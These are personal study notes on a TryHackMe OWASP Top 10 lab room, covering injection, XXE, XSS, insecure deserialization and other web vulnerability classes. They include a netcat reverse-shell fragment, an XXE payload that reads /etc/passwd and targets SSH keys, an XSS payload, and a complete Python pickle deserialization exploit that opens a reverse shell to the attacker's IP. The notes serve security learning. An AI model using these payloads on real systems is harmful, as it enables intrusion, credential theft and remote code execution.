https://tryhackme.com/room/owasptop10

### Table of contents
- [[#1. Injection]]
- [[#2. Broken Authentication]]
- [[#3. Sensitive Data Exposure]]
- [[#4. XXE - XML External Entity]]
- [[#5. Broken Access Control]]
- [[#6. Security Misconfiguration]]
- [[#7. XSS - Cross-site Scripting]]
- [[#8. Insecure Deserialization]]
- [[#9. Components with Known Vulnerabilities]]
- [[#10. Insufficent Logging & Monitoring]]

___
### 1. Injection
[[#Table of contents|Back to the top]]

Very common, user controlled input interpreted as actual commands/parameters
- SQL Injection --> access, modify, delete information in database
- Command Injection --> gain access to users systems

Defence
- Allow list: list of safe input/characters
- Stripping input: remove characters that make input interpreted as query/command
	--> look for libraries that can do that

##### OS Command Injection
Server-side code (like PHP) makes system call on hosting machine --> attackers exploits this vulnerability to execute OS commands on server
--> `whoami`, spawn reverse shell `;nc -e /bin/bash`
--> [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Active Command Injection: return responses to user, through HTML elements for instance (as opposed to blind command injection)

___
### 2. Broken Authentication
[[#Table of contents|Back to the top]]

Common flaws
- Brute force --> limit number of attempts
- Weak credentials --> strong password policies
- Weak Session Cookies: if session cookie contains predictable values, attacker can set their cookie to access other users session information

##### Re-registration of existing user
Re-register as " target_user" (space is important), memorize password
When you connect with " target_user" and password you can access the target user's session

___
### 3. Sensitive Data Exposure
[[#Table of contents|Back to the top]]

Web app accidentally divulges sensitive data --> Man in The Middle

Most common way to store large amount of data in a format that is easily accessible from many locations at once is in a database --> SQL, NoSQL, either
- running MySQL or MariaDB on **dedicated server**
- stored as files "**flat-file**", easier, common for smaller webapps, most common format *sqlite*, client *sqlite3*

1. `sqlite3 database.db`
2. `.tables`
3. `PRAGMA table_info(name_of_table);`: display table information
4. `SELECT * FROM name_of_table;`

In the example, the database was stored in `[ip_address]/assets`

___
### 4. XXE - XML External Entity
[[#Table of contents|Back to the top]]

Allows attacker to interact with backend or external systems that application can access
Can be used to DoS, [[7 SSRF|SSRF]] (Server-Side Request Forgery), port scan and execute remote code

- **In-band** XXE: attacker receives **immediate response** to XXE payload
- **OOB-XXE** (out-of-band or "blind"): **no immediate response**, attacker has to reflect output to some other file or server

[[XML]]

##### XXE payloads
```XML
<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
 <userInfo>  
  <firstName>falcon</firstName>  
  <lastName>&name;</lastName>  
 </userInfo>
```
*defining a `ENTITY` called `name` and assigning it a value `feast`*

```XML
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
*defining an `ENTITY` called `read` and assigning it a value `SYSTEM´and path of target file*

Modify the payload with default names for sensitive information such as `/home/[username]/.ssh/id_rsa`

___
### 5. Broken Access Control
[[#Table of contents|Back to the top]]

Some pages should only be accessible to admins (for instance, a page allowing to manage other users), if not then attacker can access sensitive data or perform tasks they shouldn't be able to

[[5 IDOR|IDOR]] - Insecure Direct Object Reference is a type of access control vulnerability

___
### 6. Security Misconfiguration
[[#Table of contents|Back to the top]]

- Poorly configured permissions on cloud services, like S3 buckets
- Unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Overly detailed error messages that allow attacker to find out more about system
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header

More info: https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html

___
### 7. XSS - Cross-site Scripting
[[#Table of contents|Back to the top]]

Type of injection, execute malicious scripts and have tehm execute on a victim’s machine

Web vulnerable to XSS if user input is unsanitized, possible in Javascript, VBScript, Flash and CSS

Types of XSS
- **Stored**: the most dangerous type, malicious string originates **from website’s database**, website allows unsanitized user input to be inserted into its database
2. **Reflected**: malicious **payload is part of the victims request** to the website. The website doesn't sanitize user's input before outputting its response and includes this payload in response back to the user. Most common delivery method: legitimate website url appended with malicious script (phishing)
3. **DOM-Based** (Document Object Model -- programming interface for HTML and XML documents): programs can change the document structure, style and content

Payloads
- `https://legitimate-website.com/search?q=<script>alert(“Hello World”)</script>`
  *the payload `<script>alert(“Hello World”)</script>` will pop up "Hello World"*
  --> a website that includes user's input in the space after "`q=`" without sanitizing it is vulnerable to XSS
- `document.write`: override website's HTML --> defacing
- Keylogger: log all keystrokes --> steal credentials
- Port-scanner
- ...

___
### 8. Insecure Deserialization
[[#Table of contents|Back to the top]]

**Serialization**: converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage

*For instance, data is viewed in ASCII format but is **serialized in binary** for transport and deserialized into ASCII at the end of the transport for user viewing*

Replacing data used by app with malicious code --> DoS, RCE, ...

Low exploitability: more case-by-case, need to have good understanding of target's inner-workings

Typically vulnerable to insecure deserialization
- **E-Commerce** sites
- Forums
- API's
- Application Runtimes

**Cookies** example
Inspect > **Storage** > Cookies

**Code execution** example
1. Observe cookie behaviour
2. `nc -lvnp 4444`: launch Netcat
3. Payload for RCE
```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat [YOUR IP ADDRESS HERE] 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```
4. `python3 rce.py`
   Copy base64 encoded payload
5. Paste base64 encoded payload into value of appropriate cookie
6. Refresh page
7. Enjoy reverse shell

___
### 9. Components with Known Vulnerabilities
[[#Table of contents|Back to the top]]

[Exploit Database](https://www.exploit-db.com/)

Look for an exploit online and just apply it

___
### 10. Insufficent Logging & Monitoring
[[#Table of contents|Back to the top]]

Logs should include
- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

Examples of suspicious activity
- Multiple **unauthorized attempts** for a particular action
- Requests from **anomalous IP** addresses or **locations**
- **Automated** tools: value of User-Agent headers, speed of requests
- Common **payloads**: XSS payloads